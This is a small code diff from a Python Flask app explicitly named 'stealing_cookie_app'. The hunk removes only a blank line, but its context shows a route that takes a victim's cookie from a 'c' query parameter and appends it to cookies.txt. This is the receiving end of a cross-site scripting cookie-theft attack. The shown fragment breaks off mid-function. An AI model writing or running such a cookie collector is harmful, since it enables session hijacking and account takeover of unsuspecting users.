@@ -5,7 +5,6 @@ stealing_cookie_app = Flask(__name__)
 
 @stealing_cookie_app.route('/')
 def cookie():
-
     cookie = request.args.get('c')
     f = open("cookies.txt", "a")
     if cookie:
